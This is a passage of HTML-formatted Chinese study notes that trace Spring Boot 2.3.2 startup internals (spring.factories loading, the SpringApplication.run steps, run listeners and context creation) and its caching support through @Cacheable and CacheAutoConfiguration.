class=\"hljs-keyword\">return</span> result;\n   }\n   <span class=\"hljs-keyword\">catch</span> (IOException ex) {\n      <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">IllegalArgumentException</span>(<span class=\"hljs-string\">&quot;Unable to load factories from location [&quot;</span> +\n            FACTORIES_RESOURCE_LOCATION + <span class=\"hljs-string\">&quot;]&quot;</span>, ex);\n   }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">FACTORIES_RESOURCE_LOCATION</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;META-INF/spring.factories&quot;</span>;\n</code></div></pre>\n<h3><a id=\"ApplicationContextInitializer_1508\"></a>ApplicationContextInitializer类</h3>\n<pre><code class=\"lang-properties\">org\\springframework\\boot\\spring-boot\\2.3.2.RELEASE\\\n    spring-boot-2.3.2.RELEASE.jar!\\\n        META-INF\\\n            spring.factories\norg.springframework.context.ApplicationContextInitializer=\\\norg.springframework.boot.context.ConfigurationWarningsApplicationContextInitializer,\\\norg.springframework.boot.context.ContextIdApplicationContextInitializer,\\\norg.springframework.boot.context.config.DelegatingApplicationContextInitializer,\\\norg.springframework.boot.rsocket.context.RSocketPortInfoApplicationContextInitializer,\\\norg.springframework.boot.web.context.ServerPortInfoApplicationContextInitializer\n</code></pre>\n<pre><code class=\"lang-properties\">org\\springframework\\boot\\spring-boot-autoconfigure\\2.3.2.RELEASE\\\n    spring-boot-autoconfigure-2.3.2.RELEASE.jar!\\\n        META-INF\\\n            spring.factories\n# Initializers\norg.springframework.context.ApplicationContextInitializer=\\\norg.springframework.boot.autoconfigure.SharedMetadataReaderFactoryContextInitializer,\\\norg.springframework.boot.autoconfigure.logging.ConditionEvaluationReportLoggingListener\n</code></pre>\n<h3><a id=\"ApplicationListener_1534\"></a>ApplicationListener类</h3>\n<pre><code class=\"lang-properties\">org\\springframework\\boot\\spring-boot\\2.3.2.RELEASE\\\n    spring-boot-2.3.2.RELEASE.jar!\\\n        META-INF\\\n            spring.factories\n# Application Listeners\norg.springframework.context.ApplicationListener=\\\norg.springframework.boot.ClearCachesApplicationListener,\\\norg.springframework.boot.builder.ParentContextCloserApplicationListener,\\\norg.springframework.boot.cloud.CloudFoundryVcapEnvironmentPostProcessor,\\\norg.springframework.boot.context.FileEncodingApplicationListener,\\\norg.springframework.boot.context.config.AnsiOutputApplicationListener,\\\norg.springframework.boot.context.config.ConfigFileApplicationListener,\\\norg.springframework.boot.context.config.DelegatingApplicationListener,\\\norg.springframework.boot.context.logging.ClasspathLoggingApplicationListener,\\\norg.springframework.boot.context.logging.LoggingApplicationListener,\\\norg.springframework.boot.liquibase.LiquibaseServiceLocatorApplicationListener\n</code></pre>\n<pre><code class=\"lang-properties\">org\\springframework\\boot\\spring-boot-autoconfigure\\2.3.2.RELEASE\\\n    spring-boot-autoconfigure-2.3.2.RELEASE.jar!\\\n        META-INF\\\n            spring.factories\n# Application Listeners\norg.springframework.context.ApplicationListener=\\\norg.springframework.boot.autoconfigure.BackgroundPreinitializer\n</code></pre>\n<h3><a id=\"deduceMainApplicationClass_1565\"></a>deduceMainApplicationClass()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> Class&lt;?&gt; deduceMainApplicationClass() {\n   <span class=\"hljs-keyword\">try</span> {\n      StackTraceElement[] stackTrace = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">RuntimeException</span>().getStackTrace();\n      <span class=\"hljs-keyword\">for</span> (StackTraceElement stackTraceElement : stackTrace) {\n         <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-string\">&quot;main&quot;</span>.equals(stackTraceElement.getMethodName())) {\n            <span class=\"hljs-keyword\">return</span> Class.forName(stackTraceElement.getClassName());\n         }\n      }\n   }\n   <span class=\"hljs-keyword\">catch</span> (ClassNotFoundException ex) {\n      <span class=\"hljs-comment\">// Swallow and continue</span>\n   }\n   <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;\n}\n</code></div></pre>\n<ul>\n<li>运行run方法</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> ConfigurableApplicationContext <span class=\"hljs-title function_\">run</span><span class=\"hljs-params\">(String... args)</span> {\n   <span class=\"hljs-type\">StopWatch</span> <span class=\"hljs-variable\">stopWatch</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">StopWatch</span>();\n   stopWatch.start();\n   <span class=\"hljs-type\">ConfigurableApplicationContext</span> <span class=\"hljs-variable\">context</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-literal\">null</span>;\n   Collection&lt;SpringBootExceptionReporter&gt; exceptionReporters = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ArrayList</span>&lt;&gt;();\n   configureHeadlessProperty();\n   <span class=\"hljs-comment\">/*从类路径下加载META-INF/spring.factories中配置的所有的 SpringApplicationRunListener类*/</span>\n   <span class=\"hljs-type\">SpringApplicationRunListeners</span> <span class=\"hljs-variable\">listeners</span> <span class=\"hljs-operator\">=</span> getRunListeners(args);\n    <span class=\"hljs-comment\">/*运行所有的 SpringApplicationRunListener.strating()方法*/</span>\n   listeners.starting();\n   <span class=\"hljs-keyword\">try</span> {\n      <span class=\"hljs-type\">ApplicationArguments</span> <span class=\"hljs-variable\">applicationArguments</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DefaultApplicationArguments</span>(args);\n       <span class=\"hljs-comment\">/*创建和配置环境*/</span>\n      <span class=\"hljs-type\">ConfigurableEnvironment</span> <span class=\"hljs-variable\">environment</span> <span class=\"hljs-operator\">=</span> prepareEnvironment(listeners, applicationArguments);\n      configureIgnoreBeanInfo(environment);\n      <span class=\"hljs-type\">Banner</span> <span class=\"hljs-variable\">printedBanner</span> <span class=\"hljs-operator\">=</span> printBanner(environment);\n      <span class=\"hljs-comment\">/*创建IOC容器*/</span>\n      context = createApplicationContext();\n      exceptionReporters = getSpringFactoriesInstances(SpringBootExceptionReporter.class,\n            <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Class</span>[] { ConfigurableApplicationContext.class }, context);\n       <span class=\"hljs-comment\">/*准备上下文环境*/</span>\n      prepareContext(context, environment, listeners, applicationArguments, printedBanner);\n       <span class=\"hljs-comment\">/*扫描并加载ioc容器中所有的组件*/</span>\n      refreshContext(context);\n       <span class=\"hljs-comment\">/*完成对ioc容器中所有组件的加载*/</span>\n      afterRefresh(context, applicationArguments);\n      stopWatch.stop();\n      <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">this</span>.logStartupInfo) {\n         <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">StartupInfoLogger</span>(<span class=\"hljs-built_in\">this</span>.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);\n      }\n      listeners.started(context);\n       <span class=\"hljs-comment\">/*从ioc容器中获取所有的ApplicationRunner和CommandLineRunner*/</span>\n      callRunners(context, applicationArguments);\n   }\n   <span class=\"hljs-keyword\">catch</span> (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, listeners);\n      <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">IllegalStateException</span>(ex);\n   }\n\n   <span class=\"hljs-keyword\">try</span> {\n      listeners.running(context);\n   }\n   <span class=\"hljs-keyword\">catch</span> (Throwable ex) {\n      handleRunFailure(context, ex, exceptionReporters, <span class=\"hljs-literal\">null</span>);\n      <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">IllegalStateException</span>(ex);\n   }\n    <span class=\"hljs-comment\">/*返回ioc容器*/</span>\n   <span class=\"hljs-keyword\">return</span> context;\n}\n</code></div></pre>\n<h3><a id=\"SpringApplicationRunListener_1638\"></a>SpringApplicationRunListener类</h3>\n<pre><code class=\"lang-properties\">org\\springframework\\boot\\spring-boot\\2.3.2.RELEASE\\\n    spring-boot-2.3.2.RELEASE.jar!\\\n        META-INF\\\n            spring.factories\n# Run Listeners\norg.springframework.boot.SpringApplicationRunListener=\\\norg.springframework.boot.context.event.EventPublishingRunListener\n</code></pre>\n<h3><a id=\"listenersstarting_1650\"></a>listeners.starting()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">starting</span><span class=\"hljs-params\">()</span> {\n   <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n      listener.starting();\n   }\n}\n</code></div></pre>\n<h3><a id=\"ConfigurableEnvironment_prepareEnvironment_1660\"></a>ConfigurableEnvironment prepareEnvironment()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> ConfigurableEnvironment <span class=\"hljs-title function_\">prepareEnvironment</span><span class=\"hljs-params\">(SpringApplicationRunListeners listeners,\n                                                   ApplicationArguments applicationArguments)</span> {\n    <span class=\"hljs-comment\">// Create and configure the environment</span>\n    <span class=\"hljs-type\">ConfigurableEnvironment</span> <span class=\"hljs-variable\">environment</span> <span class=\"hljs-operator\">=</span> getOrCreateEnvironment();\n    configureEnvironment(environment, applicationArguments.getSourceArgs());\n    ConfigurationPropertySources.attach(environment);\n    listeners.environmentPrepared(environment);\n    bindToSpringApplication(environment);\n    <span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-built_in\">this</span>.isCustomEnvironment) {\n        environment = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">EnvironmentConverter</span>(getClassLoader()).convertEnvironmentIfNecessary(environment,\n                                                                                               deduceEnvironmentClass());\n    }\n    ConfigurationPropertySources.attach(environment);\n    <span class=\"hljs-keyword\">return</span> environment;\n}\n</code></div></pre>\n<h4><a id=\"listenersenvironmentPrepared_1680\"></a>listeners.environmentPrepared()</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">environmentPrepared</span><span class=\"hljs-params\">(ConfigurableEnvironment environment)</span> {\n   <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n      listener.environmentPrepared(environment);\n   }\n}\n</code></div></pre>\n<h3><a id=\"printBanner_1690\"></a>printBanner()</h3>\n<pre><code class=\"lang-properties\">  .   ____          _            __ _ _\n /\\\\ / ___\'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | \'_ | \'_| | \'_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  \'  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::        (v2.3.2.RELEASE)\n</code></pre>\n<h3><a id=\"createApplicationContext_1702\"></a>createApplicationContext()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">protected</span> ConfigurableApplicationContext <span class=\"hljs-title function_\">createApplicationContext</span><span class=\"hljs-params\">()</span> {\n   Class&lt;?&gt; contextClass = <span class=\"hljs-built_in\">this</span>.applicationContextClass;\n   <span class=\"hljs-keyword\">if</span> (contextClass == <span class=\"hljs-literal\">null</span>) {\n      <span class=\"hljs-keyword\">try</span> {\n         <span class=\"hljs-keyword\">switch</span> (<span class=\"hljs-built_in\">this</span>.webApplicationType) {\n         <span class=\"hljs-keyword\">case</span> SERVLET:\n            contextClass = Class.forName(DEFAULT_SERVLET_WEB_CONTEXT_CLASS);\n            <span class=\"hljs-keyword\">break</span>;\n         <span class=\"hljs-keyword\">case</span> REACTIVE:\n            contextClass = Class.forName(DEFAULT_REACTIVE_WEB_CONTEXT_CLASS);\n            <span class=\"hljs-keyword\">break</span>;\n         <span class=\"hljs-keyword\">default</span>:\n            contextClass = Class.forName(DEFAULT_CONTEXT_CLASS);\n         }\n      }\n      <span class=\"hljs-keyword\">catch</span> (ClassNotFoundException ex) {\n         <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">IllegalStateException</span>(\n               <span class=\"hljs-string\">&quot;Unable create a default ApplicationContext, please specify an ApplicationContextClass&quot;</span>, ex);\n      }\n   }\n   <span class=\"hljs-keyword\">return</span> (ConfigurableApplicationContext) BeanUtils.instantiateClass(contextClass);\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">DEFAULT_SERVLET_WEB_CONTEXT_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.springframework.boot.&quot;</span>\n      + <span class=\"hljs-string\">&quot;web.servlet.context.AnnotationConfigServletWebServerApplicationContext&quot;</span>;\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">DEFAULT_REACTIVE_WEB_CONTEXT_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.springframework.&quot;</span>\n      + <span class=\"hljs-string\">&quot;boot.web.reactive.context.AnnotationConfigReactiveWebServerApplicationContext&quot;</span>;\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">DEFAULT_CONTEXT_CLASS</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;org.springframework.context.&quot;</span>\n			+ <span class=\"hljs-string\">&quot;annotation.AnnotationConfigApplicationContext&quot;</span>;\n</code></div></pre>\n<h3><a id=\"prepareContext_1744\"></a>prepareContext()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">prepareContext</span><span class=\"hljs-params\">(ConfigurableApplicationContext context, ConfigurableEnvironment environment,\n      SpringApplicationRunListeners listeners, ApplicationArguments applicationArguments, Banner printedBanner)</span> {\n   context.setEnvironment(environment);\n   postProcessApplicationContext(context);\n   applyInitializers(context);\n   listeners.contextPrepared(context);\n   <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">this</span>.logStartupInfo) {\n      logStartupInfo(context.getParent() == <span class=\"hljs-literal\">null</span>);\n      logStartupProfileInfo(context);\n   }\n   <span class=\"hljs-comment\">// Add boot specific singleton beans</span>\n   <span class=\"hljs-type\">ConfigurableListableBeanFactory</span> <span class=\"hljs-variable\">beanFactory</span> <span class=\"hljs-operator\">=</span> context.getBeanFactory();\n   beanFactory.registerSingleton(<span class=\"hljs-string\">&quot;springApplicationArguments&quot;</span>, applicationArguments);\n   <span class=\"hljs-keyword\">if</span> (printedBanner != <span class=\"hljs-literal\">null</span>) {\n      beanFactory.registerSingleton(<span class=\"hljs-string\">&quot;springBootBanner&quot;</span>, printedBanner);\n   }\n   <span class=\"hljs-keyword\">if</span> (beanFactory <span class=\"hljs-keyword\">instanceof</span> DefaultListableBeanFactory) {\n      ((DefaultListableBeanFactory) beanFactory)\n            .setAllowBeanDefinitionOverriding(<span class=\"hljs-built_in\">this</span>.allowBeanDefinitionOverriding);\n   }\n   <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">this</span>.lazyInitialization) {\n      context.addBeanFactoryPostProcessor(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LazyInitializationBeanFactoryPostProcessor</span>());\n   }\n   <span class=\"hljs-comment\">// Load the sources</span>\n   Set&lt;Object&gt; sources = getAllSources();\n   Assert.notEmpty(sources, <span class=\"hljs-string\">&quot;Sources must not be empty&quot;</span>);\n   load(context, sources.toArray(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>[<span class=\"hljs-number\">0</span>]));\n   listeners.contextLoaded(context);\n}\n</code></div></pre>\n<h4><a id=\"listenerscontextPrepared_1778\"></a>listeners.contextPrepared()</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">contextPrepared</span><span class=\"hljs-params\">(ConfigurableApplicationContext context)</span> {\n   <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n      listener.contextPrepared(context);\n   }\n}\n</code></div></pre>\n<h4><a id=\"listenerscontextLoaded_1788\"></a>listeners.contextLoaded()</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">contextLoaded</span><span class=\"hljs-params\">(ConfigurableApplicationContext context)</span> {\n    <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n        listener.contextLoaded(context);\n    }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-number\">2020</span>-08-<span class=\"hljs-number\">07</span> 09:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">00.064</span>  INFO <span class=\"hljs-number\">19028</span> --- [           main] com.example.SpringBootDataApplication    : Starting SpringBootDataApplication on LAPTOP-LIEB0H0I with PID <span class=\"hljs-number\">19028</span> (C:\\Users\\周庆伟\\java\\springbootdata\\target\\classes started by 周庆伟 in C:\\Users\\周庆伟\\java\\springbootdata)\n<span class=\"hljs-number\">2020</span>-08-<span class=\"hljs-number\">07</span> 09:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">00.563</span>  INFO <span class=\"hljs-number\">19028</span> --- [           main] com.example.SpringBootDataApplication    : No active profile set, falling back to <span class=\"hljs-keyword\">default</span> profiles: <span class=\"hljs-keyword\">default</span>\n\n</code></div></pre>\n<h3><a id=\"listenersstarted_1804\"></a>listeners.started()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">started</span><span class=\"hljs-params\">(ConfigurableApplicationContext context)</span> {\n   <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n      listener.started(context);\n   }\n}\n</code></div></pre>\n<h3><a id=\"callRunners_1814\"></a>callRunners</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">callRunners</span><span class=\"hljs-params\">(ApplicationContext context, ApplicationArguments args)</span> {\n   List&lt;Object&gt; runners = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ArrayList</span>&lt;&gt;();\n   runners.addAll(context.getBeansOfType(ApplicationRunner.class).values());\n   runners.addAll(context.getBeansOfType(CommandLineRunner.class).values());\n   AnnotationAwareOrderComparator.sort(runners);\n   <span class=\"hljs-keyword\">for</span> (Object runner : <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">LinkedHashSet</span>&lt;&gt;(runners)) {\n      <span class=\"hljs-keyword\">if</span> (runner <span class=\"hljs-keyword\">instanceof</span> ApplicationRunner) {\n         callRunner((ApplicationRunner) runner, args);\n      }\n      <span class=\"hljs-keyword\">if</span> (runner <span class=\"hljs-keyword\">instanceof</span> CommandLineRunner) {\n         callRunner((CommandLineRunner) runner, args);\n      }\n   }\n}\n</code></div></pre>\n<h3><a id=\"listenersrunning_1833\"></a>listeners.running()</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">running</span><span class=\"hljs-params\">(ConfigurableApplicationContext context)</span> {\n   <span class=\"hljs-keyword\">for</span> (SpringApplicationRunListener listener : <span class=\"hljs-built_in\">this</span>.listeners) {\n      listener.running(context);\n   }\n}\n</code></div></pre>\n<h2><a id=\"SpringBoot_1843\"></a>SpringBoot缓存</h2>\n<p><img src=\"https://cdn.qingweico.cn/blog/6043572d360785be54a8d7ed.png\" alt=\"image-20200807145952386\" /></p>\n<p>CachingManager管理多个Cache组件,而每个组件都有自己的唯一一个名称</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*StudentService*/</span>\n<span class=\"hljs-meta\">@Cacheable(cacheNames = {&quot;studentInfo&quot;} ,key =&quot;#id&quot;)</span>\n<span class=\"hljs-keyword\">public</span> Student <span class=\"hljs-title function_\">findById</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> id)</span>{\n    System.out.println(<span class=\"hljs-string\">&quot;连接数据库啦！！&quot;</span>);\n    <span class=\"hljs-keyword\">return</span> studentDao.findById(id);\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*标注在启动类上表示开启缓存*/</span>\n<span class=\"hljs-meta\">@EnableCaching</span>\n</code></div></pre>\n<h3><a id=\"Cacheable_1863\"></a>@Cacheable注解</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-meta\">@interface</span> Cacheable {\n    <span class=\"hljs-meta\">@AliasFor(&quot;cacheNames&quot;)</span>\n    String[] value() <span class=\"hljs-keyword\">default</span> {};\n\n    <span class=\"hljs-meta\">@AliasFor(&quot;value&quot;)</span>\n    String[] cacheNames() <span class=\"hljs-keyword\">default</span> {};\n\n    String <span class=\"hljs-title function_\">key</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;          <span class=\"hljs-comment\">//指定缓存数据的key。默认为方法参数的值</span>\n                                      \n    String <span class=\"hljs-title function_\">keyGenerator</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n\n    String <span class=\"hljs-title function_\">cacheManager</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n\n    String <span class=\"hljs-title function_\">cacheResolver</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n\n    String <span class=\"hljs-title function_\">condition</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n\n    String <span class=\"hljs-title function_\">unless</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;\n\n    <span class=\"hljs-type\">boolean</span> <span class=\"hljs-title function_\">sync</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-literal\">false</span>;\n}\n\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">String[] cacheNames() <span class=\"hljs-keyword\">default</span> {}; <span class=\"hljs-comment\">//指定缓存组件的名称 等价于value</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">String <span class=\"hljs-title function_\">key</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;           <span class=\"hljs-comment\">//指定缓存数据的key。默认为方法参数的值</span>\n</code></div></pre>\n<pre><code class=\"lang-properties\">#指定key时可以使用spEL表达式\n    key =&quot;#root.methodName&quot;     //当前被调用的方法名\n    key =&quot;#root.method.name&quot;    //当前被调用的方法\n    key =&quot;#root.target&quot;         //当前被调用的目标对象\n    key =&quot;#root.targetClass&quot;    //当前被调用的目标对象类\n    key =&quot;#root.args[0]&quot;        //当前被调用方法的参数列表\n    key =&quot;#root.caches[0].name&quot; //当前方法调用的缓存列表\n    key =&quot;#result&quot;              //当前方法执行返回的值\n    key =&quot;#参数&quot; key =&quot;#a0&quot;      //当前参数的值 0代表参数的索引·\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*key和keyGenerator只可以选择一个使用*/</span>\nString <span class=\"hljs-title function_\">keyGenerator</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>; <span class=\"hljs-comment\">//key的生成器</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">String <span class=\"hljs-title function_\">cacheManager</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>; <span class=\"hljs-comment\">//指定缓存管理器</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*cacheManager和cacheResolver只可以使用一个*/</span>\nString <span class=\"hljs-title function_\">cacheResolver</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;<span class=\"hljs-comment\">//指定缓存解析器</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">String <span class=\"hljs-title function_\">condition</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;   <span class=\"hljs-comment\">//指定的条件满足时才会缓存方法的返回值</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">String <span class=\"hljs-title function_\">unless</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-string\">&quot;&quot;</span>;      <span class=\"hljs-comment\">//指定的条件不满足时才会缓存方法的返回值</span>\n</code></div></pre>\n<h3><a id=\"CacheAutoConfiguration_1932\"></a>自动配置类CacheAutoConfiguration</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">CacheConfigurationImportSelector</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">ImportSelector</span> {\n   <span class=\"hljs-meta\">@Override</span>\n   <span class=\"hljs-keyword\">public</span> String[] selectImports(AnnotationMetadata importingClassMetadata) {\n      CacheType[] types = CacheType.values();\n      String[] imports = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">String</span>[types.length];\n      <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">i</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">0</span>; i &lt; types.length; i++) {\n         imports[i] = CacheConfigurations.getConfigurationClass(types[i]);\n      }\n      <span class=\"hljs-keyword\">return</span> imports;\n   }\n}\n</code></div></pre>\n<pre><code class=\"lang-properties\">/*imports*/\norg.springframework.boot.autoconfigure.cache.GenericCacheConfiguration\norg.springframework.boot.autoconfigure.cache.JCacheCacheConfiguration\norg.springframework.boot.autoconfigure.cache.EhCacheCacheConfiguration\norg.springframework.boot.autoconfigure.cache.HazelcastCacheConfiguration\norg.springframework.boot.autoconfigure.cache.InfinispanCacheConfiguration\norg.springframework.boot.autoconfigure.cache.CouchbaseCacheConfiguration\norg.springframework.boot.autoconfigure.cache.RedisCacheConfiguration\norg.springframework.boot.autoconfigure.cache.CaffeineCacheConfiguration\norg.springframework.boot.autoconfigure.cache.SimpleCacheConfiguration\norg.springframework.boot.autoconfigure.cache.NoOpCacheConfiguration\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Configuration(proxyBeanMethods = false)</span>\n<span class=\"hljs-meta\">@ConditionalOnMissingBean(CacheManager.class)</span>\n<span class=\"hljs-meta\">@Conditional(CacheCondition.class)</span>\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">SimpleCacheConfiguration</span> {\n   <span class=\"hljs-meta\">@Bean</span>\n    <span class=\"hljs-comment\">/*给容器中注册了ConcurrentMapCacheManager,可以用来获取和创建ConcurrentMapCache类型的缓存组件*/</span>\n   ConcurrentMapCacheManager <span class=\"hljs-title function_\">cacheManager</span><span class=\"hljs-params\">(CacheProperties cacheProperties,\n         CacheManagerCustomizers cacheManagerCustomizers)</span> {\n      <span class=\"hljs-type\">ConcurrentMapCacheManager</span> <span class=\"hljs-variable\">cacheManager</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ConcurrentMapCacheManager</span>();\n      List&lt;String&gt; cacheNames = cacheProperties.getCacheNames();\n      <span class=\"hljs-keyword\">if</span> (!cacheNames.isEmpty()) {\n         cacheManager.setCacheNames(cacheNames);\n      }\n      <span class=\"hljs-keyword\">return</span> cacheManagerCustomizers.customize(cacheManager);\n   }\n}\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">ConcurrentMapCache</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">AbstractValueAdaptingCache</span> {\n	<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> String name;\n     <span class=\"hljs-comment\">/*数据保存在ConcurrentMap中*/</span>\n	<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> ConcurrentMap&lt;Object, Object&gt; 